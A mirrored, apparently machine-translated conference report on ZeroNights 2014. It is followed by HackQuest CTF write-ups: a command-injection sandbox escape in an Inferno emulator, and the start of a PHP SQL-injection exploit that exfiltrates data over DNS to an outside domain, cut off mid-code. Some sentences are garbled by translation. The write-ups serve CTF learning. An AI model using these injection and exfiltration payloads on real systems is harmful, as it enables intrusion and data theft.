<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Conference ZeroNights 2014 - how everything was</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="For the fourth time, a conference dedicated to information security was held in Moscow - ZeroNights 2014. 



 Like last year, in order to get to Zero...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Conference ZeroNights 2014 - how everything was</h1><div class="post__text post__text-html js-mediator-article">  For the fourth time, a conference dedicated to information security was held in Moscow - ZeroNights 2014. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/3c8/958/d08/3c8958d083f838879d18bac86b14b9ae.jpg" alt="image"><br><br>  Like last year, in order to get to ZeroNights, you had to either buy a ticket to the event or win it at HackQuest.  About HackQuest we announced <a href="http://habrahabr.ru/company/dsec/blog/238711/">on Habr√©</a> , and, as expected, the tasks were quite high complexity.  Instead of the allotted 24 hours for each task, some hung for three days without a solution, but with a bunch of hints.  How do you, for example, hack a program written in Limbo, which runs in the Inferno OS emulator, or write firmware for a device in Verilog, which is connected as a person in the middle between two other devices that transmit the encrypted data to each other?  On 5 out of 8 assignments, participants published raitaps, which you can find below. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The conference was held for two days: November 13 and 14.  At the same time, it was possible to attend two tracks in which reports were read, or to take part in workshops in which cool technical tricks were told and shown, and thus taught you.  Also, the Hardware Village worked all two days - a stand with radio, RFID, NFC and wired equipment for carrying out attacks. <br>  In addition to the main program, there were also Fast Track - short 15-minute reports on everything and Defensive Track - 20-minute reports on security in any environment. <br>  Workshops were on a variety of topics: from how-to on tools and standard unsafe settings of routers, to hacking the AES-128-ECB key through the readings of electricity consumed. <a name="habracut"></a><br><br>  All two days of the conference, a stand from Qiwi worked, from which one could get branded stickers and bracelets, but the most interesting thing was the real Qiwi terminal, with which conference visitors could interact in any way.  In the case of a terminal hacking, the hacker was encouraged with 150 thousand rubles, but, unfortunately, no one was able to crack it in full.  Also, they distributed Qiwi Visa Unembossed cards, which could be obtained by taking photos with Qiwi-girls, and putting the photo on a social network with the hashtags #zeronighs and #qiwi. <br><img src="https://habrastorage.org/getpro/habr/post_images/96d/06d/5df/96d06d5dfca942bac623e3744534a4de.jpg" alt="image"><img src="https://habrastorage.org/getpro/habr/post_images/0e2/a4a/c37/0e2a4ac379ed2064abf3c991e99bd507.jpg" alt="image"><br><br>  The reports were very diverse and interesting, there were really a lot of them.  An introductory speech at the conference was given to Alexander Peslyak, who made a presentation on " <a href="http://www.openwall.com/presentations/ZeroNights2014-Is-Infosec-A-Game/">Is infosec a game?</a> ", Implementing the presentation in the form of a DOS game, the last modification of which is dated 1995, and replacing its resources. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/379/909/1c0/3799091c0574fc8d33bedd55177a192d.jpg" alt="image"><br><br>  Personally, I really liked Boris Ivanov‚Äôs workshop ‚Äú <a href="http://2014.zeronights.ru/assets/files/slides/ivanovb-zeronights.pdf">Investigation of a computer {banking} banking trojan‚Äôs incident</a> ‚Äù, in which you had the opportunity to do the same things that virus analysts do when analyzing a banking trojan‚Äôs infected machine, and Roman Korkykyan ‚Äù <a href="http://2014.zeronights.ru/assets/files/slides/korkikyan.pdf">We are looking for cryptographic algorithm keys through consumed power</a> "which I mentioned earlier. <br><br>  Here is one of the reviews about the conference: <br><blockquote>  In my opinion, the most important event of the year was the international conference on the practical aspects of information security, ZeroNights. <br><br>  The greatest interest was the presentations of speakers related to the safety of automated control systems (APCS).  These topics have been presented in several reports.  The first of the reports was devoted to the security analysis of the FDT / DTM technology, which provides a unified interface for controlling heterogeneous field devices that are part of a single process control system.  As part of this work, a team of researchers from Digital Security company using fuzzing investigated about 750 field devices using the HART protocol, and 500 of them discovered vulnerabilities, such as remote code execution, denial of service, race condition, xml injection.  More details on the results of the study and the methods of fuzzing used can be found in the report located on the company's website. <br><br>  Another report covering the security of the automated process control systems was devoted to the security analysis of 4G mobile networks.  Researchers at Positive Technologies have found a number of vulnerabilities that allow sending a binary SMS message to the victim‚Äôs number, gain a foothold on its SIM card ‚Äî cause it to be blocked, change the subscriber, and track its location.  This topic is becoming extremely relevant due to the wide distribution of industrial control systems built on the use of radio channels (in particular, based on 4G networks).  Similar systems are also used in the field of railway infrastructure. <br><br>  Also at the conference various events aimed at improving professional skills and qualities were held.  At the Hardware Village site, visitors could explore and work with various hardware and software.  Methods of analyzing malware, methods of forensics on mobile platforms, methods of hacking cryptographic algorithms were demonstrated on two separate, so-called workshop platforms.  Throughout the conference, Qiwi terminals worked, where visitors could try to find vulnerabilities and exploit them.  Qiwi also organized computer security competitions - CTF (Capture The Flag), which took place on a separate site, in parallel with the presentations of the speakers.  In conclusion, we can say that all the reports were very interesting and informative, and thanks to the free communication at the conference and the friendly atmosphere, we managed to make new acquaintances, discuss interesting news and many other topics related to practical aspects of information security. <br><br>  Many thanks to the organizers for the opportunity to informally communicate with colleagues, get acquainted with the results of in-depth studies conducted by leading foreign and Russian experts in the field of cybersecurity, and the high level of conference organization. <br><br>  - Alexander Korotin (Leading Specialist, Cyber ‚Äã‚ÄãSecurity Center, Russian Railways) </blockquote><br><br><h4>  Writeups </h4><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><h2>  Day 1/8 - Alighieri (reverse) </h2><br>  Winners: BECHED &amp;&amp; OKOB.  The author of the raitap is BECHED. <br>  The task was also decided: derwolfman, neomant, Anton Cherepanov <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  We're given a binary 2014_1_Alighieri.exe. <br><pre><code class="bash hljs">$ file 2014_1_Alighieri.exe 2014_1_Alighieri.exe: PE32 executable (console) Intel 80386, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> MS Windows</code> </pre> <br><br>  We can conclude that you‚Äôve been using the emulator for InfernoOS (https://github.com/fr1tz/aid/blob/master/emu/port/main.c). <br>  Let's launch the binary in wine: <br><br><pre> <code class="bash hljs">$ wine 2014_1_Alighieri.exe ...Gimme something... $ wine 2014_1_Alighieri.exe asd ...But already my desire and my will were being turned like a wheel, all at one speed, by the Love <span class="hljs-built_in"><span class="hljs-built_in">which</span></span> moves the sun and the other stars.-1.000000 -1.200000 ! -1.000000 -1.200000 ! -1.222220 -1.200000 ! 0.000000 -1.200000 ! Your system has been tainted... S0rry! =-+_&amp;*¬¶‚Ññ—û&lt;¬¶¬¨B¬¨VI-N¬¶</code> </pre><br><br>  Clearly, the emulator is somehow patched.  We can notice that we‚Äôve been observing the binary.  Parse the .gz files using '\ xc0 \ x0c \ x80 \ x30 \ x80 \ x40' magic string. <br>  This is a copy of the binaries written in Limbo language. <br>  Unpack emuinit.b.gz and take a look at this part of the code: <br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(len args &lt; 2) sys-&gt;fprint(sys-&gt;fildes(2), <span class="hljs-string"><span class="hljs-string">"Gimme something..."</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ str := <span class="hljs-string"><span class="hljs-string">"-c /dis/echo "</span></span> + hd tl args + <span class="hljs-string"><span class="hljs-string">" | /dis/crypt"</span></span>; args1 := list of {<span class="hljs-string"><span class="hljs-string">"sh"</span></span>, str,}; mod: Command; (mod, args1) = loadmod(args1); mod-&gt;init(nil, args1); }</code> </pre><br><br>  There's a vulnerability leading to sandbox escape: <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="bash hljs">$ wine 2014_1_Alighieri.exe <span class="hljs-string"><span class="hljs-string">'LOL ;/dis/sh.dis;/dis/echo AHAHA'</span></span> ...LOL ; ls / / /appl /bin /boot /cdrom /chan /dev /dis /env /etc /fd /fonts /home /initrd.img /initrd.img.old /lib /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /mnt /n /net /net.alt /nvfs /opt /poem.txt /prof /prog /root /run /sbin /srv /tmp /usr /var /vmlinuz</code> </pre><br><br>  We can download them (http://code.google.com/r/jasoncatena-acmesac/source/browse/), which is mounted in Inferno VM. <br><br><pre> <code class="bash hljs"> ; ./cat.dis /mnt/blas.txt I2luY2x1ZGUgImxpYjkuaCIKI2luY2x1ZGUgIm1hdGhpLmgiCgpkb3VibGUKZG90KGludCBuLCBk b3VibGUgKngsIGRvdWJsZSAqeSkKewoJZG91YmxlCXN1bSA9IDA7CglpbnQgaSA9IChpbnQpIHlb MF07Cgl1bnNpZ25lZCBjaGFyIGtbXSA9IHsgMCwxLDIsMyw0LDUsNiw3LDgsOSB9OwoJdW5zaWdu ZWQgY2hhciBqID0gKHVuc2lnbmVkIGNoYXIpIHhbMF07CQoKCXByaW50ZigiJWYgJWYgIVxuIiwg eFszXSwgeVszXSk7CgoJaWYgKG4gPD0gMCkgCgkJcmV0dXJuIDA7Cgl3aGlsZSAobi0tKSB7CgkJ c3VtICs9ICp4KysgKiAqeSsrOwoJfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg ICAgICAgCiAgICAgIAlzdW0gPSAoZG91YmxlKSAoaiBeIGtbaV0pOwoKCXJldHVybiBzdW07Cn0K CgppbnQKaWFtYXgoaW50IG4sIGRvdWJsZSAqeCkKewoJaW50CWksIG07Cglkb3VibGUJeG0sIGE7 CglpZiAobiA8PSAwKSAKCQlyZXR1cm4gMDsKCW0gPSAwOwoJeG0gPSBmYWJzKCp4KTsKCWZvciAo aSA9IDE7IGkgPCBuOyBpKyspIHsKCQlhID0gZmFicygqKyt4KTsKCQlpZiAoeG0gPCBhKSB7CgkJ CW0gPSBpOwoJCQl4bSA9IGE7CgkJfQoJfQoJcmV0dXJuIG07Cn0KCgpkb3VibGUKbm9ybTEoaW50 IG4sIGRvdWJsZSAqeCkKewoJZG91YmxlCXN1bSA9IDA7CglpZiAobiA8PSAwKSAKCQlyZXR1cm4g MDsKCXdoaWxlIChuLS0pIHsKCQlzdW0gKz0gZmFicygqeCk7CgkJeCsrOwoJfQoJcmV0dXJuIHN1 bTsKfQoKCmRvdWJsZQpub3JtMihpbnQgbiwgZG91YmxlICp4KQp7Cglkb3VibGUJc3VtID0gMDsK CWlmIChuIDw9IDApIAoJCXJldHVybiAwOwoJd2hpbGUgKG4tLSkgewoJCXN1bSArPSAqeCAqICp4 OwoJCXgrKzsKCX0KCXJldHVybiBzdW07Cn0K</code> </pre><br></div></div><br><br>  Decode: <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"lib9.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"mathi.h"</span></span></span><span class="hljs-meta"> double dot(int n, double *x, double *y) { double sum = 0; int i = (int) y[0]; unsigned char k[] = { 0,1,2,3,4,5,6,7,8,9 }; unsigned char j = (unsigned char) x[0]; printf(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"%f %f !\n"</span></span></span><span class="hljs-meta">, x[3], y[3]); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (n &lt;= 0) return 0; while (n--) { sum += *x++ * *y++; } sum = (double) (j ^ k[i]); return sum; } int iamax(int n, double *x) { int i, m; double xm, a; </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (n &lt;= 0) return 0; m = 0; xm = fabs(*x); for (i = 1; i &lt; n; i++) { a = fabs(*++x); </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (xm &lt; a) { m = i; xm = a; } } return m; } double norm1(int n, double *x) { double sum = 0; </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (n &lt;= 0) return 0; while (n--) { sum += fabs(*x); x++; } return sum; } double norm2(int n, double *x) { double sum = 0; </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (n &lt;= 0) return 0; while (n--) { sum += *x * *x; x++; } return sum; }</span></span></code> </pre><br></div></div><br><br>  Note that dot () function obviously always returns 51 (ord ('3')). <br>  See the system initialization.  Now let's take a look at crypto.b: <br><pre> <code class="cpp hljs">... x := <span class="hljs-built_in"><span class="hljs-built_in">array</span></span>[] of {<span class="hljs-number"><span class="hljs-number">50.0</span></span>, <span class="hljs-number"><span class="hljs-number">432432.32423</span></span>, <span class="hljs-number"><span class="hljs-number">0.0</span></span>, <span class="hljs-number"><span class="hljs-number">-1.0</span></span>}; y := <span class="hljs-built_in"><span class="hljs-built_in">array</span></span>[] of {<span class="hljs-number"><span class="hljs-number">1.00</span></span>, <span class="hljs-number"><span class="hljs-number">24373.231879</span></span>, <span class="hljs-number"><span class="hljs-number">0.0</span></span>, <span class="hljs-number"><span class="hljs-number">-1.2</span></span>}; decrypt := <span class="hljs-number"><span class="hljs-number">0</span></span>; secret: <span class="hljs-built_in"><span class="hljs-built_in">array</span></span> of byte; alg := DEFAULTALG; rand-&gt;init(<span class="hljs-number"><span class="hljs-number">132321</span></span>); s := <span class="hljs-string"><span class="hljs-string">"P"</span></span> + <span class="hljs-string"><span class="hljs-string">"r"</span></span> + <span class="hljs-string"><span class="hljs-string">"i"</span></span> + <span class="hljs-string"><span class="hljs-string">"vet"</span></span> + <span class="hljs-string"><span class="hljs-string">"Py"</span></span> + <span class="hljs-string"><span class="hljs-string">"otr"</span></span> + <span class="hljs-string"><span class="hljs-string">"!"</span></span> + <span class="hljs-string"><span class="hljs-string">"Py"</span></span> + <span class="hljs-string"><span class="hljs-string">"otr"</span></span> + <span class="hljs-string"><span class="hljs-string">"lo"</span></span> + <span class="hljs-string"><span class="hljs-string">"ves"</span></span> + <span class="hljs-string"><span class="hljs-string">"Go"</span></span> + <span class="hljs-string"><span class="hljs-string">"&amp;Po"</span></span> + <span class="hljs-string"><span class="hljs-string">"ke"</span></span> + <span class="hljs-string"><span class="hljs-string">"mons"</span></span> + <span class="hljs-string"><span class="hljs-string">"!236"</span></span>+<span class="hljs-string"><span class="hljs-string">"783"</span></span>; secret = <span class="hljs-built_in"><span class="hljs-built_in">array</span></span> of byte s; <span class="hljs-meta"><span class="hljs-meta"># enough for tips guys, the s3cr3t could be found in the dis file... you need to go d333p3r inside it! s = string secret; sys-&gt;fprint(stderr, </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"Your system has been tainted... S0rry!\r\n"</span></span></span><span class="hljs-meta">); ...</span></span></code> </pre><br><br>  'PrivetPyotr! PyotrlovesGo &amp; Pokemons! 236783' is not a flag, there's something more.  The source code is clearly trimmed. <br>  Let's get the disassembly of crypt.dis: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="bash hljs">; disdump crypt.dis frame <span class="hljs-variable"><span class="hljs-variable">$8</span></span>, 40(fp) ... newa <span class="hljs-variable"><span class="hljs-variable">$4</span></span>, <span class="hljs-variable"><span class="hljs-variable">$3</span></span>, 40(fp) // x := array[] of {50.0, 432432.32423, 0.0, -1.0}; indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span> movf 80(mp), 0(96(fp)) indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span> movf 96(mp), 0(96(fp)) indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> movf 40(mp), 0(96(fp)) indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$3</span></span> movf 104(mp), 0(96(fp)) newa <span class="hljs-variable"><span class="hljs-variable">$4</span></span>, <span class="hljs-variable"><span class="hljs-variable">$3</span></span>, 48(fp) // y := array[] of {1.00, 24373.231879, 0.0, -1.2}; indf 48(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span> movf 48(mp), 0(96(fp)) indf 48(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span> movf 88(mp), 0(96(fp)) indf 48(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> movf 40(mp), 0(96(fp)) indf 48(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$3</span></span> movf 112(mp), 0(96(fp)) movw <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 60(fp) movp 228(mp), 56(fp) mframe 224(mp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 96(fp) movw <span class="hljs-variable"><span class="hljs-variable">$132321</span></span>, 32(96(fp)) // rand-&gt;init(132321); mcall 96(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 224(mp) movp 136(mp), 76(fp) cvtca 76(fp), 44(fp) indb 44(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> mframe 212(mp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 100(fp) movp 40(fp), 32(100(fp)) movp 48(fp), 36(100(fp)) lea 112(fp), 16(100(fp)) mcall 100(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 212(mp) cvtfw 112(fp), 92(fp) cvtwb 92(fp), 0(96(fp)) indf 40(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span> indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> // s[2] = chr(int(dot(3,x,y))&amp;0xFF) mulf 0(96(fp)), 64(mp), 112(fp) // x[1] = (x[2] * 64(mp))/72(mp) divf 72(mp), 112(fp), 0(100(fp)) indf 48(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> // y[2] = 48(fp) = 50.0 movf 48(mp), 0(100(fp)) indb 44(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$4</span></span> // s[2] = chr(int(dot(3,x,y))&amp;0xFF) mframe 212(mp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 92(fp) movp 40(fp), 32(92(fp)) movp 48(fp), 36(92(fp)) lea 112(fp), 16(92(fp)) mcall 92(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 212(mp) cvtfw 112(fp), 96(fp) cvtwb 96(fp), 0(100(fp)) indf 40(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$3</span></span> indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$3</span></span> mulf 0(96(fp)), 56(mp), 0(100(fp)) // x[3] *= 56(mp) = 1.22222 indf 48(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> movf 40(mp), 0(100(fp)) // y[2] = 40(mp) = 0.0 indb 44(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$35</span></span> // s[35] = chr(int(dot(3,x,y))&amp;0xFF) mframe 212(mp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 92(fp) movp 40(fp), 32(92(fp)) movp 48(fp), 36(92(fp)) lea 112(fp), 16(92(fp)) mcall 92(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 212(mp) cvtfw 112(fp), 96(fp) cvtwb 96(fp), 0(100(fp)) indf 40(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$3</span></span> indf 40(fp), 96(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span> mulf 0(96(fp)), 64(mp), 112(fp) // x[3] *= (x[1] * 64(mp))/72(mp) divf 72(mp), 112(fp), 0(100(fp)) indf 48(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$2</span></span> movf 40(mp), 0(100(fp)) // y[2] = 40(mp) = 0.0 indb 44(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$36</span></span> // s[36] = chr(int(dot(3,x,y))&amp;0xFF) mframe 212(mp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 92(fp) movp 40(fp), 32(92(fp)) movp 48(fp), 36(92(fp)) lea 112(fp), 16(92(fp)) mcall 92(fp), <span class="hljs-variable"><span class="hljs-variable">$0</span></span>, 212(mp) cvtfw 112(fp), 96(fp) cvtwb 96(fp), 0(100(fp)) indb 44(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$37</span></span> // s[37] = rand(2014) mframe 224(mp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span>, 92(fp) movw <span class="hljs-variable"><span class="hljs-variable">$2014</span></span>, 32(92(fp)) lea 96(fp), 16(92(fp)) mcall 92(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span>, 224(mp) cvtwb 96(fp), 0(100(fp)) indb 44(fp), 100(fp), <span class="hljs-variable"><span class="hljs-variable">$34</span></span> // s[34] = rand(2014) - 50 mframe 224(mp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span>, 92(fp) movw <span class="hljs-variable"><span class="hljs-variable">$2014</span></span>, 32(92(fp)) lea 96(fp), 16(92(fp)) mcall 92(fp), <span class="hljs-variable"><span class="hljs-variable">$1</span></span>, 224(mp) subw <span class="hljs-variable"><span class="hljs-variable">$50</span></span>, 96(fp) ...</code> </pre><br></div></div><br><br>  The next step is to analyze rand () algorithm.  The source code of patched library is located at /appl/lib/rand.b. <br>  implement Rand; <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="cpp hljs">include <span class="hljs-string"><span class="hljs-string">"rand.m"</span></span>; rsalt: big; init(seed: <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>) { rsalt = big <span class="hljs-number"><span class="hljs-number">10</span></span>; } MASK: con (big <span class="hljs-number"><span class="hljs-number">1</span></span>&lt;&lt;<span class="hljs-number"><span class="hljs-number">63</span></span>)-(big <span class="hljs-number"><span class="hljs-number">1</span></span>); rand(modulus: <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> { rsalt = rsalt * big <span class="hljs-number"><span class="hljs-number">1103515245</span></span> + big <span class="hljs-number"><span class="hljs-number">12345</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(modulus &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (((rsalt&amp;MASK)&gt;&gt;<span class="hljs-number"><span class="hljs-number">10</span></span>) % big modulus); } # <span class="hljs-number"><span class="hljs-number">0</span></span> &lt; modulus &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>^<span class="hljs-number"><span class="hljs-number">53</span></span> bigrand(modulus: big): big { rsalt = rsalt * big <span class="hljs-number"><span class="hljs-number">1103515245</span></span> + big <span class="hljs-number"><span class="hljs-number">12345</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(modulus &lt;= big <span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> big <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ((rsalt&amp;MASK)&gt;&gt;<span class="hljs-number"><span class="hljs-number">10</span></span>) % modulus; }</code> </pre><br></div></div><br><br>  We are putting the algorithm in key generation in python: <br><pre> <code class="python hljs">rsalt = <span class="hljs-number"><span class="hljs-number">10</span></span> MASK = (<span class="hljs-number"><span class="hljs-number">1</span></span>&lt;&lt;<span class="hljs-number"><span class="hljs-number">63</span></span>)-(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(modulus)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> rsalt <span class="hljs-keyword"><span class="hljs-keyword">global</span></span> MASK rsalt = rsalt * <span class="hljs-number"><span class="hljs-number">1103515245</span></span> + <span class="hljs-number"><span class="hljs-number">12345</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> modulus &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> int (((rsalt&amp;MASK)&gt;&gt;<span class="hljs-number"><span class="hljs-number">10</span></span>) % modulus) s = [ord(x) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-string"><span class="hljs-string">'PrivetPyotr!PyotrlovesGo&amp;Pokemons!236783'</span></span>] s[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">51</span></span> s[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">51</span></span> s[<span class="hljs-number"><span class="hljs-number">35</span></span>] = <span class="hljs-number"><span class="hljs-number">51</span></span> s[<span class="hljs-number"><span class="hljs-number">36</span></span>] = <span class="hljs-number"><span class="hljs-number">51</span></span> s[<span class="hljs-number"><span class="hljs-number">37</span></span>] = rand(<span class="hljs-number"><span class="hljs-number">2014</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span> s[<span class="hljs-number"><span class="hljs-number">34</span></span>] = rand(<span class="hljs-number"><span class="hljs-number">2014</span></span>) - <span class="hljs-number"><span class="hljs-number">50</span></span> &amp; <span class="hljs-number"><span class="hljs-number">0xFF</span></span> <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">''</span></span>.join([chr(x) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> s])</code> </pre><br><br>  Launch it and get the flag: <br><br><pre> <code class="bash hljs">$ python genkey.py Pr3v3tPyotr!PyotrlovesGo&amp;Pokemons!w33\83</code> </pre><br></div></div><br><br><h2>  Day 2/8 - Yolochka (Misc / Pentest) </h2><br>  Winner and author of the hangup: BECHED. <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  One server has 9100 (Apache Tomcat) and 1521 (Oracle TNS) ports (1510 (tcpwrapped)). <br><br>  It‚Äôs time to solve it.  Here are the steps, which actually led to the flag. <br><br>  1. Guess the directory on the web server (it's the name of the task): <a href="http://80.70.234.121/">80.70.234.121</a> : 9100 / yolochka / <br><br>  2. If you‚Äôre on the whole query, you‚Äôre injecting the whole query. <br>  Write an exploit for DNS data exfiltration: <br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">1</span></span>; $i &lt; <span class="hljs-number"><span class="hljs-number">100</span></span>; ++$i) { $query = <span class="hljs-string"><span class="hljs-string">"SELECT table_name FROM (SELECT DISTINCT owner, ROWNUM r, table_name FROM all_tables) WHERE r=$i"</span></span>; $name = urlencode(<span class="hljs-string"><span class="hljs-string">"select UTL_INADDR.get_host_address(($query)||'.zeronights.ahack.ru') from dual"</span></span>); 